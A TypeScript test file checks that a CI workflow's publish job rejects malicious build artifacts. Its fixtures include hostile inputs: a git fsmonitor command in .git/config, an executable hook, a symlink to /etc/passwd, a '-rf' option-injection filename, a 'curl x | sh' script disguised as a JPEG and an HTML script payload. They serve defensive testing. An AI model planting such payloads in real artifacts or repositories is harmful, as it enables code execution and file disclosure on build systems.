/**
 * M1 closeout: the image-scout artifact trust boundary.
 *
 * The generate job runs third-party code, so its artifact is untrusted input to the
 * write-enabled publish job. These tests take the publish job's real validation step out of
 * the parsed workflow (js-yaml) and run it with bash against synthetic artifacts, both valid
 * and malicious. A malicious artifact must fail the step (fail closed) and leave nothing
 * staged; a valid one must be copied, as plain 0644 files only, into a new empty directory
 * that the publish step, not the artifact, turns into a git repository.
 */
import { test } from 'node:test';
import assert from 'node:assert/strict';
import { spawnSync, execFileSync } from 'node:child_process';
import { chmodSync, existsSync, mkdirSync, mkdtempSync, readdirSync, rmSync, statSync, symlinkSync, writeFileSync, linkSync } from 'node:fs';
import { tmpdir } from 'node:os';
import { join } from 'node:path';
import yaml from 'js-yaml';

type Step = { name?: string; uses?: string; run?: string; env?: Record<string, string>; with?: Record<string, unknown>; 'working-directory'?: string };
const wf = yaml.load(execFileSync('cat', ['.github/workflows/image-scout.yml'], { encoding: 'utf8' })) as { jobs: Record<string, { steps: Step[] }> };
const publish = wf.jobs.publish.steps;
const download = publish.find((s) => s.uses?.startsWith('actions/download-artifact@'))!;
const validate = publish.find((s) => /^Validate results/.test(s.name ?? ''))!;
const push = publish.find((s) => /^Publish results/.test(s.name ?? ''))!;

const JPEG = Buffer.from([0xff, 0xd8, 0xff, 0xe0, 0, 0x10, 0x4a, 0x46, 0x49, 0x46, 0, 1]);
const WEBP = Buffer.concat([Buffer.from('RIFF'), Buffer.from([0x24, 0, 0, 0]), Buffer.from('WEBPVP8 ')]);

type Fixture = (src: string) => void;
/** A valid artifact like a real scout run: results, a contact sheet, snapshots, editorial images. */
const valid: Fixture = (src) => {
  writeFileSync(join(src, 'results.json'), '{"harbor":[]}');
  writeFileSync(join(src, 'harbor-sunrise.jpg'), JPEG);
  writeFileSync(join(src, 'pulse.json'), '{"events":[]}');
  writeFileSync(join(src, 'candidates.json'), '[]');
  mkdirSync(join(src, 'editorial'));
  writeFileSync(join(src, 'editorial', 'img-night-trails-600.webp'), WEBP);
};

/** Runs the workflow's validation step on an artifact built by `build`. */
function runValidation(build: Fixture) {
  const temp = mkdtempSync(join(tmpdir(), 'scout-publish-test-'));
  const src = join(temp, 'scout-artifact');
  const out = join(temp, 'scout-publish');
  mkdirSync(src);
  build(src);
  const r = spawnSync('bash', ['-c', validate.run!], { cwd: temp, encoding: 'utf8', env: { PATH: process.env.PATH, SRC: src, OUT: out } });
  const staged = existsSync(out) ? execFileSync('find', ['.', '-mindepth', '1'], { cwd: out, encoding: 'utf8' }).trim().split('\n').filter(Boolean).sort() : null;
  return { temp, out, status: r.status, output: `${r.stdout}${r.stderr}`, staged };
}

test('the publish job downloads outside the workspace and publishes only the staged directory', () => {
  assert.equal(download.with?.path, '${{ runner.temp }}/scout-artifact');
  assert.equal(validate.env?.SRC, '${{ runner.temp }}/scout-artifact');
  assert.equal(validate.env?.OUT, '${{ runner.temp }}/scout-publish');
  assert.equal(push['working-directory'], '${{ runner.temp }}/scout-publish');
  assert.deepEqual(publish.map((s) => s.uses?.split('@')[0] ?? s.name), ['actions/download-artifact', validate.name, push.name]);
  assert.match(validate.run!, /^set -euo pipefail$/m);
  // Every entry is validated before anything is copied, and copies are fresh 0644 files.
  assert.ok(validate.run!.indexOf('done < <(find . -mindepth 1 -print0)') < validate.run!.indexOf('mkdir -m 0755 -- "$OUT"'));
  assert.match(validate.run!, /install -D -m 0644 -- "\$p" "\$OUT\/\$\{p#\.\/\}"/);
  // The privileged git operations never trust repository-provided or ambient git config/hooks.
  assert.match(push.run!, /\[ ! -e \.git \] \|\|/);
  assert.match(push.run!, /export GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_GLOBAL=\/dev\/null/);
  assert.match(push.run!, /git config core\.hooksPath \/dev\/null/);
});

test('a valid artifact is staged as plain 0644 files in a new directory without .git', () => {
  const r = runValidation((src) => {
    valid(src);
    chmodSync(join(src, 'pulse.json'), 0o755); // executable bits are not carried over
  });
  try {
    assert.equal(r.status, 0, r.output);
    assert.match(r.output, /Staged 5 files \(\d+ bytes\) in a clean publishing directory/);
    assert.deepEqual(r.staged, ['./candidates.json', './editorial', './editorial/img-night-trails-600.webp', './harbor-sunrise.jpg', './pulse.json', './results.json']);
    for (const f of r.staged!.filter((p) => p.includes('.'))) {
      const st = statSync(join(r.out, f));
      if (st.isFile()) assert.equal(st.mode & 0o777, 0o644, `${f} mode`);
    }
    assert.ok(!existsSync(join(r.out, '.git')));
  } finally {
    rmSync(r.temp, { recursive: true, force: true });
  }
});

test('malicious artifacts are rejected (fail closed) and nothing is staged', () => {
  const cases: [string, Fixture, RegExp][] = [
    ['.git directory with config', (s) => { mkdirSync(join(s, '.git')); writeFileSync(join(s, '.git', 'config'), '[core]\n\tfsmonitor = touch /tmp/pwned\n'); }, /unexpected directory: \.\/\.git/],
    ['empty .git directory', (s) => mkdirSync(join(s, '.git')), /unexpected directory: \.\/\.git/],
    ['executable hook', (s) => { mkdirSync(join(s, '.git', 'hooks'), { recursive: true }); writeFileSync(join(s, '.git', 'hooks', 'pre-commit'), '#!/bin/sh\necho pwned\n', { mode: 0o755 }); }, /unexpected directory: \.\/\.git/],
    ['.gitattributes', (s) => writeFileSync(join(s, '.gitattributes'), '* filter=evil\n'), /unexpected file name: \.\/\.gitattributes/],
    ['.gitmodules', (s) => writeFileSync(join(s, '.gitmodules'), '[submodule "x"]\n'), /unexpected file name: \.\/\.gitmodules/],
    ['dot-file with an allowed extension', (s) => writeFileSync(join(s, '.hidden.json'), '{}'), /unexpected file name: \.\/\.hidden\.json/],
    ['symlink to a system file', (s) => symlinkSync('/etc/passwd', join(s, 'evil.jpg')), /symlink in results: \.\/evil\.jpg/],
    ['symlinked editorial directory', (s) => { rmSync(join(s, 'editorial'), { recursive: true }); symlinkSync('/', join(s, 'editorial')); }, /symlink in results: \.\/editorial/],
    ['dangling symlink', (s) => symlinkSync('../../outside.json', join(s, 'up.json')), /symlink in results: \.\/up\.json/],
    ['named pipe', (s) => execFileSync('mkfifo', [join(s, 'pipe.json')]), /special file in results: \.\/pipe\.json/],
    ['nested directory', (s) => { mkdirSync(join(s, 'editorial', 'deep'), { recursive: true }); writeFileSync(join(s, 'editorial', 'deep', 'x.webp'), WEBP); }, /unexpected directory: \.\/editorial\/deep/],
    ['unexpected top-level directory', (s) => { mkdirSync(join(s, 'scripts')); writeFileSync(join(s, 'scripts', 'a.json'), '{}'); }, /unexpected directory: \.\/scripts/],
    ['newline in a file name', (s) => writeFileSync(join(s, 'a\n.jpg'), JPEG), /unexpected file name: \$\.\/a\\n\.jpg/],
    ['leading dash (option injection)', (s) => writeFileSync(join(s, '-rf.json'), '{}'), /unexpected file name: \.\/-rf\.json/],
    ['parent-directory lookalike', (s) => writeFileSync(join(s, '..json'), '{}'), /unexpected file name: \.\/\.\.json/],
    ['executable content', (s) => writeFileSync(join(s, 'run.sh'), '#!/bin/sh\n', { mode: 0o755 }), /unexpected file name: \.\/run\.sh/],
    ['script disguised as a JPEG', (s) => writeFileSync(join(s, 'evil.jpg'), '#!/bin/sh\ncurl x | sh\n'), /not a JPEG: \.\/evil\.jpg/],
    ['HTML disguised as a WebP', (s) => writeFileSync(join(s, 'editorial', 'x-600.webp'), '<script>alert(1)</script>'), /not a WebP: \.\/editorial\/x-600\.webp/],
    ['invalid JSON', (s) => writeFileSync(join(s, 'pulse.json'), '{not json'), /invalid JSON: \.\/pulse\.json/],
    ['hard link is copied, not linked', (s) => linkSync(join(s, 'results.json'), join(s, 'second.json')), /^$/],
    ['missing results.json', (s) => rmSync(join(s, 'results.json')), /results\.json is missing/],
    ['too many files', (s) => { for (let i = 0; i < 500; i++) writeFileSync(join(s, `f${i}.json`), '{}'); }, /too many files \(50[0-9]\)/],
    ['too large', (s) => { writeFileSync(join(s, 'big.webp'), WEBP); execFileSync('truncate', ['-s', '53000000', join(s, 'big.webp')]); }, /results too large \(\d+ bytes\)/],
  ];
  for (const [name, mutate, expected] of cases) {
    const r = runValidation((src) => {
      valid(src);
      mutate(src);
    });
    try {
      if (name.startsWith('hard link')) {
        // Not malicious: accepted, but the staged copy is an independent file.
        assert.equal(r.status, 0, `${name}: ${r.output}`);
        assert.equal(statSync(join(r.out, 'second.json')).nlink, 1, `${name}: staged copy is not a link`);
        continue;
      }
      assert.notEqual(r.status, 0, `${name}: validation must fail\n${r.output}`);
      // Paths are printed shell-quoted (${p@Q}); compare without the quotes.
      assert.match(r.output.replace(/'/g, ''), expected, `${name}: ${r.output}`);
      assert.equal(r.staged, null, `${name}: nothing may be staged`);
    } finally {
      rmSync(r.temp, { recursive: true, force: true });
    }
  }
});

test('the staged directory has no route back to the artifact', () => {
  const r = runValidation(valid);
  try {
    assert.equal(r.status, 0, r.output);
    const walk = (d: string): string[] => readdirSync(d, { withFileTypes: true }).flatMap((e) => (e.isDirectory() ? walk(join(d, e.name)) : [join(d, e.name)]));
    for (const f of walk(r.out)) {
      const st = statSync(f, { throwIfNoEntry: true });
      assert.ok(st.isFile() && st.nlink === 1, `${f}: independent regular file`);
    }
  } finally {
    rmSync(r.temp, { recursive: true, force: true });
  }
});
